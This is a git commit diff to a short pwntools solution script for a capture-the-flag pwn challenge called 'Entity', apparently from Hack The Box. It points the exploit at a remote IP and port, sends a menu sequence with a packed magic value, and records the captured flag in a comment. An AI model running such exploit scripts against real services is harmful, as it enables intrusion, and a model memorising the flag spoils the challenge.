a3ad2d9192af50e7700f36fff6a7aef666bc45a5
ShundaZhang <zhangshunda@gmail.com>
2023-01-09 09:27:21 +0800

    Solved Entity.

--- ctf/pwn/Entity/dec.py
+++ ctf/pwn/Entity/dec.py
@@ -1,12 +1,14 @@
 from pwn import *
 
-io = process('./entity')
+#io = process('./entity')
 
-#ip, process = 
-#io = remote(ip, port)
+ip, port = "165.22.115.189", 31099
+io = remote(ip, port)
 
 io.sendlineafter('>>', 'T')
 io.sendlineafter('>>', 'S')
 io.sendlineafter('>>', p64(13371337))
 io.sendlineafter('>>', 'C')
 print io.recvall()
+
+#HTB{th3_3nt1ty_0f_htb00_i5_5t1ll_h3r3}
